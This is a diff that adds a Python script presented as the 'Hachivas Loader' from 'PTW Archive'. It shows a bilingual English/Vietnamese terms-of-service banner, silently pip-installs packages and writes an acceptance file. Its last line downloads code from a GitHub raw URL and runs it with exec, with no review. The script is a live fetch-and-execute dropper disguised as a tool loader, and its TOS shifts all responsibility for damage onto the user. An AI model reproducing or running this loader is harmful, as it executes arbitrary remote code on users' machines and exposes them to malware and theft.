@@ -1,0 +1,71 @@
+import sys
+import time
+from time import sleep, strftime
+from datetime import datetime
+import threading
+import webbrowser, os, re, json, random
+import msvcrt
+
+try:
+    from faker import Faker
+    from requests import session
+    from colorama import Fore, Style
+    import requests, random, re
+    from random import choice, randint, shuffle
+    import requests, pystyle
+    from pystyle import Write, Colors, Box
+except:
+    os.system("pip install faker")
+    os.system("pip install requests")
+    os.system("pip install colorama")
+    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install pycryptodome')
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+os.system('cls')
+confirmation = print("\033[1;31m                                Press any key only when you agree and understand the TOS.")
+TOS = print(Box.Lines("Hachivas Archive Terms of Service (TOS)")
+banner = f"""
+
+
+                                            ENGLISH
+
+              The term "We" refers to the entire Developer/Owner of Luxury and Luxury's Archive as a whole, 
+                   while "You" refers to you as the user and person using the products of PTW Archiver.
+
+     You need to ensure that you voluntarily download/use Hachivas Loader without any coercion from anyone/a third party.
+  "Someone/a third party" here mainly refers to the cases You are asked by a server/stranger to start this application.
+
+            By pressing continue(enter), you agree that you will not use Hachivas Loader in particular/PTW's Archive
+                                products in general for commercial purposes(eg selling).
+
+             You must also accept that you will be solely responsible for all situations/cases that MAY occur
+               to your device during/after the period of using the PRODUCTS IN Hachivas Loader. (Not the loader.)
+
+            At the same time, we will maintain and ensure the safety of all users when using Hachivas Loader and any 
+ participation/influence on our actions may result in a PERMANENT BAN OF HWID of the person who committed the above act.
+
+            By continuing to use any products maintained by PTW's Archive, you voluntarily agree to be bound 
+                                by the most current version of the Terms of Service.
+
+                                    RE-EDIT BY PTW COMUNITY/AprillZerx
+
+                                             VIỆT NAM
+            Bằng cách nhấn tiếp tục(enter), bạn đồng ý rằng bạn sẽ không sử dụng Hachivas Loader nói riêng/PTW's Archive
+                                sản phẩm nói chung cho mục đích thương mại (ví dụ như bán).
+
+             Bạn cũng phải chấp nhận rằng bạn sẽ tự chịu trách nhiệm về mọi tình huống/trường hợp CÓ THỂ xảy ra
+               vào thiết bị của bạn trong/sau thời gian sử dụng SẢN PHẨM TRONG Hachivas Loader. (Không phải bộ tải.)
+
+            Đồng thời, chúng tôi sẽ duy trì và đảm bảo sự an toàn cho tất cả người dùng khi sử dụng Hachivas Loader và bất kỳ
+ việc tham gia/ảnh hưởng đến hành động của chúng tôi có thể dẫn đến lệnh CẤM HWID VĨNH VIỄN đối với người thực hiện hành vi trên.
+
+            Bằng việc tiếp tục sử dụng bất kỳ sản phẩm nào được PTW's Archive duy trì, bạn tự nguyện đồng ý bị ràng buộc
+                                theo phiên bản mới nhất của Điều khoản dịch vụ.
+
+                                CHỈNH SỬA LẠI BỞI PTW COMUNITY/AprilZerx
+"""[1:]
+Write.Print((banner), Colors.white_to_green, interval=0.00025)
+msvcrt.getch()
+file = open('TOSVDOIAHWOIHSAKLFHWA.txt', 'a')
+file.write("""The user have accepted PTW Archive's terms of service.""")
+file.close()
+exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Main').text)
